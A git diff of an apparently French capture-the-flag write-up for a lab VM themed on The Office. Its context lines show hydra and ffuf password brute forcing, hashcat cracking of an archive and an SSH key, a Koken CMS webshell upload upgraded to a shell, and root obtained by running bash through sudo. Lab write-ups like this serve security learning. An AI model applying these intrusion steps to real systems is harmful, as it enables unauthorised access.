@@ -12,7 +12,7 @@ Il y a 8 flags à récupérer sur la machine virtuelle dont le thème est centr�
 
 Allez c'est parti !  
 
-```plain
+```
 $ sudo nmap -sCV -T5 -p- 192.168.56.18 
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.18 
@@ -41,7 +41,7 @@ Sur le port 80 se trouve une page qui indique que le site est en construction ma
 
 On copie colle le texte [sur dcode.fr](https://www.dcode.fr/code-morse) et on obtient le clair suivant :  
 
-```plain
+```
 JIM   AND   PAM   HAVE   TALKED   ABOUT   ME   IN   MORSE   CODE   SEVERAL   TIMES.
 BUT   JOKE'S   ON   THEM   BECAUSE   I   KNOW   MORSE   CODE.
 SINCE   YOU   COULD   READ   THIS   I   ASSUME   YOU   KNOW   IT   TOO.
@@ -53,7 +53,7 @@ FLAG1:   8CAF9C64F9D1181206FEC7F40A7524B3
 
 Pour aller plus loin il faut user d'une énumération web :  
 
-```plain
+```
 403        9l       28w      278c http://192.168.56.18/server-status 
 200      469l       24w     2819c http://192.168.56.18/ 
 301        9l       28w      313c http://192.168.56.18/nick 
@@ -78,7 +78,7 @@ Les deux derniers dossiers sont listables. Dans le premier on peut trouver une c
 
 La capture réseau correspond à une connexion réussie sur le port FTP. Evidemment le mot de passe est en clair, il n'y avait aucune difficulté sur cette partie.  
 
-```plain
+```
 220 (vsFTPd 3.0.3)
 USER creed
 331 Please specify the password.
@@ -126,7 +126,7 @@ for i in range(1000):
 
 Hydra est une fois de plus de la partie :  
 
-```plain
+```
 $ hydra -l creed -P pass.txt ftp://192.168.56.18 
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 
 Hydra (https://github.com/vanhauser-thc/thc-hydra)
@@ -140,13 +140,13 @@ Avant d'aller plus loin, finissons en avec les autres ports web.
 
 Sur le port 65533 une énumération rapporte un dossier nommé *secret* sur lequel on trouve le flag suivant :  
 
-```plain
+```
 #FLAG2: 0a9025f72493da059a26db3acb0e2c42
 ```
 
 Pour terminer, le port 18888 fait tourner une appli web de galerie d'image et on trouve aussi une URL */admin* qui fait tourner un soft baptisé *Koken*.  
 
-```plain
+```
 200        0l        0w        0c http://192.168.56.18:18888/i.php
 301        9l       28w      321c http://192.168.56.18:18888/app 
 301        9l       28w      323c http://192.168.56.18:18888/admin
@@ -161,7 +161,7 @@ Back to les moutons
 
 Une fois connecté au FTP avec les identifiants récupérés plus tôt on remarque deux fichiers :  
 
-```plain
+```
 -rw-r--r--    1 0        0            2026 Nov 12  2020 archive.zip 
 -rw-r--r--    1 0        0             176 Nov 30  2020 reminder.txt
 ```
@@ -178,7 +178,7 @@ Le fichier texte a le contenu suivant :
 
 L'archive s'est montrée assez récalcitrante à casser. J'ai utilisé une nouvelle fois [Penglab](https://github.com/mxrch/penglab) pour casser le pass. Ce notebook Python qui utilise la puissance de calcul de Google dispose de deux wordlists : la bien connue RockYou ainsi que la gigantesque *hashesorg2019*. C'est avec cette dernière que le mot de passe *bigboobz* est tombé :  
 
-```plain
+```
 !hashcat -m 17220 /tmp/hashcat.txt /content/wordlists/hashesorg2019
 ```
 
@@ -186,14 +186,14 @@ Bien sûr il faut au préalable utiliser l'utilitaire *zip2john* pour convertir 
 
 Deux fichiers sont présents dans cette archive :  
 
-```plain
+```
 email:   ASCII text, with very long lines (306), with CRLF line terminators 
 michael: PEM RSA private key
 ```
 
 On dispose de cet email intéressant :  
 
-```plain
+```
 To: oscar@dundermifflin.com
 Subject: Costume Party
 From: michael@dundermifflin.com
@@ -210,7 +210,7 @@ The password is most probably one of her cats name.
 
 ainsi que d'une clé privée SSH mais celle-i est protégée par une passphrase. Rebelote donc mais avec *ssh2john* cette fois puis Penglab avec la commande suivante :  
 
-```plain
+```
 !hashcat -m 22931 /tmp/ssh.txt /content/wordlists/hashesorg2019
 ```
 
@@ -225,7 +225,7 @@ Il est temps de se pencher sur l'indication concernant Angela et les noms de ses
 
 Je voulais me servir de CeWL pour générer la wordlist directement depuis la page mais en raison d'un freeze j'ai sagement copié / collé les noms dans une wordlist.  
 
-```plain
+```
 Sprinkles
 Garbage
 Bandit
@@ -247,7 +247,7 @@ Lady Aragorn
 
 Cette fois *ffuf* est plus approprié pour le brute force web :  
 
-```plain
+```
 $ ffuf -u "http://192.168.56.18:18888/api.php?/sessions" -X POST \
   -H "Content-type: application/x-www-form-urlencoded" \
   -d "email=angela%40dundermifflin.com&password=FUZZ" \
@@ -291,7 +291,7 @@ J'obtiens alors mon webshell à cette adresse : *http://192.168.56.18:18888/stor
 
 Plus qu'à upgrader cela avec ReverseSSH et on a tout le confort d'un véritable shell :)  
 
-```plain
+```
 www-data@doomsday:/var/www/koken/storage$ cat configuration/database.php    
 <?php 
         return array( 
@@ -306,7 +306,7 @@ www-data@doomsday:/var/www/koken/storage$ cat configuration/database.php    
 
 A défaut de servir vraiment à quelque chose ces identifiants permettent d'accéder à un flag supplémentaire :  
 
-```plain
+```
 mysql> select * from flag; 
 +----------------------------------------+ 
 | record                                 | 
@@ -320,7 +320,7 @@ Très peu pour moi
 
 Je trouve une référence à du port knocking dans un des dossiers web :
 
-```plain
+```
 www-data@doomsday:/var/www$ ls -al /var/www/html/_hint_/  
 total 408 
 drwxr-xr-x 2 root root   4096 Nov 30  2020 . 
@@ -337,7 +337,7 @@ www-data@doomsday:/$ md5sum /var/www/html/_hint_/knockknock*
 
 L'un des fichiers est différent et renferme l'ordre des ports à taper dans ses tags EXIF   
 
-```plain
+```
 $ strings ./html/_hint_/knockknock2.jpg 
 Exif 
 #FLAG6: c9db6b7cad326cab2bcf0d2a26f7832d 
@@ -358,7 +358,7 @@ $ ssh -L 2223:[::1]:22 -N -p 8888 127.0.0.1
 $ ssh -p 2223 -i michael michael@127.0.0.1
 ```
 
-```plain
+```
 $ ssh -p 2223 -i michael michael@127.0.0.1  
 ______                 _            ___  ____  __  __ _ _        
 |  _  \               | |           |  \/  (_)/ _|/ _| (_)       
@@ -396,14 +396,14 @@ On touche au but. Le fichier *defuse* mentionné n'est pas présent dans le doss
 
 Sauf que la bonne blague c'est qu'on ne parvient pas à mettre des droits d'exécution sur le fichier :  
 
-```plain
+```
 Commande :	SITE CHMOD 755 defuse
 Réponse :	500 Unknown SITE command.
 ```
 
 THEFUCK! Et si on tente de déposer puis utiliser une clé SSH pour *creed* :  
 
-```plain
+```
 michael@doomsday:~$ ssh -i .ssh/id_rsa creed@::1 
 ______                 _            ___  ____  __  __ _ _        
 |  _  \               | |           |  \/  (_)/ _|/ _| (_)       
@@ -416,7 +416,7 @@ creed@::1: Permission denied (publickey).
 
 Et pour cause, à la fin du fichier */etc/ssh/sshd\_config* on lit ceci :  
 
-```plain
+```
 DenyUsers creed
 ```
 
@@ -426,7 +426,7 @@ J'ai créé ledit fichier avec vraiment un astérisque comme dernier caractère.
 
 Finalement LinPEAS pouvait m'indiquer que le fichier de configuration du serveur FTP est modifiable :  
 
-```plain
+```
 ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500) 
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files 
 /dev/mqueue 
@@ -445,7 +445,7 @@ Il faut alors changer la valeur de l'option *chmod\_enable* en fin de fichier et
 
 J'ai downloadé et uploadé bash avec le nom *defuse* et c'était bon :  
 
-```plain
+```
 michael@doomsday:~$ sudo /home/creed/defuse -p
 # id
 uid=0(root) gid=0(root) groups=0(root)
@@ -561,7 +561,7 @@ except RequestException as exception:
 
 You're welcome.  
 
-```plain
+```
 $ python3 koken_exploit.py http://192.168.56.18:18888/ angela@dundermifflin.com Crinklepuss                                   
 Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated) 
 -- devl00p.github.io 2022 -- 
